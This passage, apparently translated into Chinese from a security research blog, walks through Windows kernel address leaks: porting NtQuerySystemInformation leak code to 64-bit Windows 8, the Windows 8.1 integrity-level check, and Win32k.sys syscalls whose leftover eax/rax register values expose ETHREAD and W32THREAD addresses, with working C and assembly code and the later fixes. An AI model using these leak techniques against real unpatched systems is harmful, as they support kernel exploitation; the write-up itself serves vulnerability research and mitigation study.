        printf("Object 0x%llxt", object);
    #else
        printf("Object 0x%Xt", object);
    #endif
在64位Windows 8上的运行结果：
最终的代码也可以从Github上下载。
**  
**
**SystemLockInformation**
为了让SystemLockInformation可用于64位Windows，必须添加另一个填充变量，当我测试时，这个变量里面好像没有任何东西，不过，也可能还有其他用途，只是我没有注意到罢了。字段大小不会相加，因为还要考虑对齐问题。
       ULONG   Reserved2[2];
    #ifdef _WIN64
        ULONG   Reserved3;
    #endif
此外，还必须修修改打印锁地址的printf语句，使其支持64位地址。
    #ifdef _WIN64
        printf("Lock Address 0x%llxt", lockAddress);
    #else
        printf("Lock Address 0x%Xt", lockAddress);
    #endif
之后，它就可以在64位Windows 8上面正常使用了：
最终的代码也可以从Github上下载。
**  
**
**SystemExtendedProcessInformation**
SystemExtendedProcessInformation所需的改动也很少，只要在SYSTEM_THREAD_INFORMATION结构中填充128位即可——它肯定是有用处的，但具体我还不太清楚。
    #ifdef _WIN64
        ULONG Reserved[4];
    #endif
    }SYSTEM_THREAD_INFORMATION, *PSYSTEM_THREAD_INFORMATION;
另外，处理地址的printf语句需要像前面介绍的那样进行相应的更新。
    #ifdef _WIN64
        printf("Stack base 0x%llxt", stackBase);
        printf("Stack limit 0x%llxrn", stackLimit);
    #else
        printf("Stack base 0x%Xt", stackBase);
        printf("Stack limit 0x%Xrn", stackLimit);
    #endif
完成上述修改之后，代码就可以在64位Windows 8上面正常运行了：
最终的代码也可以从Github上下载。
**  
**
**Windows 8.1 64 bit onward**
至于在Windows 8.1上修改这些代码方面，我还是多少有点优势的：毕竟我早就阅读过Alex
Ionescu的一篇文章，因此我知道可通过一种稍微不同的方式来运行二进制代码。 在Windows
Vista中引入了完整性级别的概念，这将导致所有进程在下面所示的六个完整性级别之一上面运行。
完整性级别较高的进程可以访问更多的系统资源，例如沙盒进程通常是在较低的完整性级别上面运行，并且对系统其余部分的访问权限是最小的。
更多的细节可以在上面链接的MSDN页面上找到。
我创建了一个完整性水平较低的cmd.exe副本，具体方法请参见这里。当我试图在这个命令提示符下面运行NtQuerySystemInformation的二进制代码时，就会得到错误代码0xC0000022：
STATUS_ACCESS_DENIED的这个NTSTATUS代码定义如下：
进程已请求访问对象，但尚未授予这些访问权限。
但是，如果在中等完整性级别的命令提示符下运行该二进制代码话，则一切正常：
这意味着必须向函数添加完整性级别检查。
您可以使用SysInternals中的procexp查看完整性级别进程（见最后一列）：
这时我开始研究，为了添加了该项检查，NtQuerySystemInformation在Windows
8和8.1之间发生了哪些变化。利用IDA考察NtQuerySystemInformation函数后，我发现它依赖于调用“ExpQueryInformationProcess”函数。
通过Diaphora检查这两个版本的ntoskrnl.exe的差异，我发现这个函数在两个操作系统版本之间发生了重大变化。
通过比较两个实现汇编代码的不同之处，很容易就可以看出，这里添加了一个对“ExIsRestrictedCaller”的调用，通过交叉引用可以获悉，它主要是从ExpQuerySystemInformation中调用的，并且在相关函数中也被调用了几次。
我还看了一下函数本身，我注释的汇编代码见下文。
**根据我的理解，该函数的工作机制为：**
1、检查在ecx中传递给它的未知值是否为0，如果是的话就返回0
2、使用PsReferencePrimaryToken增加调用进程令牌的引用计数
3、使用SeQueryInformationToken将调用进程令牌的TokenIntegrityLevel读入一个局部变量
4、使用ObDereferenceObject减少调用进程令牌的引用计数
5、检查SeQueryInformationToken是否返回错误代码，如果是就返回1
6、如果SeQueryInformationToken成功，将读取令牌完整性级别，并与0x2000（这个值表示中等完整性级别）进行比较
7、如果令牌完整性级别低于0x2000则返回1，否则返回0
Alex Ionescu在他的博客上提供了这个函数的逆向版本。 每次该函数被调用时，它就返回1，然后调用函数将返回前面提到的错误代码。
**Win32k.sys系统调用信息泄露** **Windows 7 32 bit**
这个问题最初是由j00ru在发布白皮书几个月前发现的，并在原始博客文章中有更深入的讨论。
问题是，win32k.sys中的一些系统调用的返回值是小于32位的，例如VOID或USHORT，所以，在返回之前没有清除eax寄存器。
由于各种原因，在调用返回之前，内核地址在eax中结束，因此在调用之后立即读取eax，这些地址就会被完全暴露或部分暴露。
例如NtUserModifyUserStartupInfoFlags就完全暴露了ETHREAD结构的地址，下面你可以看到，在该函数返回之前调用了UserSessionSwitchLeaveCrit，这似乎向eax中加载了一个指向ETHREAD的指针，但是，由于函数返回之前没有清空寄存器的内容，导致这个地址完整保留了下来。
要想使用这些系统调用来泄漏地址，我们首先需要添加标准include和Winddi，因为它们定义了将要调用的函数使用的一些GDI（图形设备接口）的结构。
    #include "stdafx.h"
    #include 
    #include 
我决定，通过使用其用户空间包装器（在这种情况下是user32.dll和gdi32.dll）来调用这些系统调用，因此我需要获取DLL中的函数的偏移量。为此，我把该dll拖拽到IDA中，将反汇编重定位到0，然后过滤函数列表以寻找目标函数。这样，找到的函数的起始地址是我需要的dll的偏移量。
我选择了一个完全泄漏ETHREAD的函数，以及一个部分泄漏它的函数。类似的方法同样适用于W32THREAD。
    //0x64D4B - NtUserModifyUserStartupInfoFlags
    typedef DWORD(NTAPI * lNtUserModifyUserStartupInfoFlags)(DWORD Set, DWORD Flags);
    //0xA2F4 - NtUserGetAsyncKeyState
    typedef DWORD(NTAPI *lNtUserGetAsyncKeyState)(DWORD key);
    //0x47123 - NtGdiFONTOBJ_vGetInfo
    typedef VOID(NTAPI * lNtGdiFONTOBJ_vGetInfo)(FONTOBJ *pfo,ULONG cjSize,FONTINFO *pfi);
    //0x47263 - NtGdiPATHOBJ_vEnumStartClipLines
    typedef VOID(NTAPI * lNtGdiPATHOBJ_vEnumStartClipLines)(PATHOBJ *ppo, CLIPOBJ *pco, SURFOBJ *pso, LINEATTRS *pla);
为了调用这些函数，我们首先需要一个处理它们所在的DLL的句柄，所以，我们首先设法得到user32.dll的句柄。
    HMODULE hUser32 = LoadLibraryA("user32.dll");
    if (hUser32 == NULL) {
        printf("Failed to load user32");
        return 1;
    }
如果上述代码成功运行，我们就可以把第一个函数的偏移量与HMODULE的值相加，从而获得函数入口点，然后就可以将其转换为正确的类型了。
    lNtUserGetAsyncKeyState pNtUserGetAsyncKeyState = (lNtUserGetAsyncKeyState)((DWORD_PTR)hUser32 + 0xA2F4);
然后，我们调用该函数并使用内联汇编来获取在eax中留下的值，并打印出来。
    pNtUserGetAsyncKeyState(20);
    unsigned int ethread = 0;
    __asm {
        mov ethread, eax;
    }
    printf("NtUserGetAsyncKeyState ETHREAD partial disclosure: 0x%Xrn", ethread);
然后，我们对NtUserModifyUserStartupInfoFlags进行同样的处理。
    lNtUserModifyUserStartupInfoFlags pNtUserModifyUserStartupInfoFlags = (lNtUserModifyUserStartupInfoFlags)((DWORD_PTR)hUser32 + 0x64D4B);
    pNtUserModifyUserStartupInfoFlags(20, 12);
    unsigned ethread_full = 0;
    __asm {
        mov ethread_full, eax;
    }
    printf("NtUserModifyUserStartupInfoFlags ETHREAD full disclosure: 0x%Xrn", ethread_full);
接下来，我们需要调用暴露W32THREAD指针的函数，它们都是在gdi32.dll中定义的，所以我们需要得到该DLL的句柄，然后就可以像前面那样来调用这些函数了。
    HMODULE hGDI32 = LoadLibraryA("gdi32.dll");
    if (hGDI32 == NULL) {
        printf("Failed to load gdi32");
        return 1;
    }
    lNtGdiFONTOBJ_vGetInfo pNtGdiFONTOBJ_vGetInfo = (lNtGdiFONTOBJ_vGetInfo)((DWORD_PTR)hGDI32 + NtGdiFONTOBJ_vGetInfoAddress);
    FONTOBJ surf = { 0 };
    FONTINFO finfo = { 0 };
    pNtGdiFONTOBJ_vGetInfo(&surf, 123, &finfo);
    long int w32thread = 0;
    __asm {
        mov w32thread, eax;
    }
    printf("NtGdiEngUnLockSurface W32THREAD full disclosure: 0x%Xrn", w32thread);
    lNtGdiPATHOBJ_vEnumStartClipLines pNtGdiPATHOBJ_vEnumStartClipLines = (lNtGdiPATHOBJ_vEnumStartClipLines)((DWORD_PTR)hGDI32 + 0x47263);
    PATHOBJ pathobj = { 0 };
    CLIPOBJ pco = { 0 };
    SURFOBJ pso = { 0 };
    LINEATTRS pla = { 0 };
    pNtGdiPATHOBJ_vEnumStartClipLines(&pathobj, &pco, &pso, &pla);
    w32thread = 0;
    __asm {
        mov w32thread, eax;
    }
    printf("NtGdiPATHOBJ_vEnumStartClipLines W32THREAD full disclosure: 0x%Xrn", w32thread);
编译并运行代码，我们就可以看到被暴露的地址了。
**Windows 8 64 bit onward**
要使代码在Windows 8上运行，必须首先更新函数偏移量来匹配新的主机VM的二进制代码。
请注意，这里缺少NtGdiFONTOBJ_vGetInfo函数的地址，因为该函数在Windows 8 VM的gdi32版本中没有相应的定义。
    //win8, 64bit
    #define NtUserModifyUserStartupInfoFlagsAddress 0x263F0
    #define NtUserGetAsyncKeyStateAddress 0x3B30
    #define NtGdiPATHOBJ_vEnumStartClipLinesAddress 0x67590
第二个问题是，Visual Studio不支持针对amd64代码的内联汇编，所以我添加了一个名为“asm_funcs.asm”的简短文件，具体内容如下所示：
    _DATA SEGMENT
    _DATA ENDS
    _TEXT SEGMENT
    PUBLIC get_rax
    get_rax PROC
    ret
    get_rax ENDP
    _TEXT ENDS
    END
所有这些实际上就是定义了一个名为“get_rax”的函数，虽然它什么都不做，但却会返回，并且根据调用约定，返回值将保存在rax中。
此外，我们还必须对Visual Studio项目的配置稍作修改，以使其编译所包含的汇编代码，为此，可以在solution
explorer中右键单击项目，转到“Build Dependencies” – >“Build
Customizations..”，然后在对话窗口中勾选'masm'选项。 Elias Bachaalany提供了更为详细的介绍，请访问这里。
然后，通过将这个函数声明为一个外部函数，将该函数导入到主文件中。
     extern "C" unsigned long long get_rax();
最后，将相应的变量的长度改为64位，同时所有的printf语句也要进行相应的修改。
最终的代码可以从Github上下载。
忙活半天，终于可以在64位系统上运行我们的代码了，并且这个问题在Windows 8中也得到了修复！
Matt Miller在Black Hat USA 2012上的演讲的内核部分中讨论Windows 8漏洞利用缓解改进情况的时候，曾经引用了这个修复：
解决这些问题的方法非常简单，观察一下的从Windows 7和Windows
8中的win32.sys（如下图所示），我们可以看到，现在这些函数的实现方式中，调用敏感函数后所有的RAX被设置为一个新值。例如，在我考察过的两个泄露ETHREAD的函数中，UserSessionSwitchLeaveCrit导致返回前将泄露的地址放入RAX/
EAX中，这个问题已得到修复。
NtUserGetAsyncKeyState：Windows 8的实现在左边，Windows 7的实现在右边。
以前，这会导致泄漏ETHREAD的部分地址，因为在函数返回之前，只有eax的前16位被修改，现在使用movsx后，它将对较高的位进行清零。
NtUserModifyUserStartupInfoFlags：Windows 8的实现在左边，Windows 7的实现在右边。
以前，这会泄漏完整的ETHREAD地址，因为eax在返回之前根本没有被修改，现在eax被显式地设置为1。
**  
**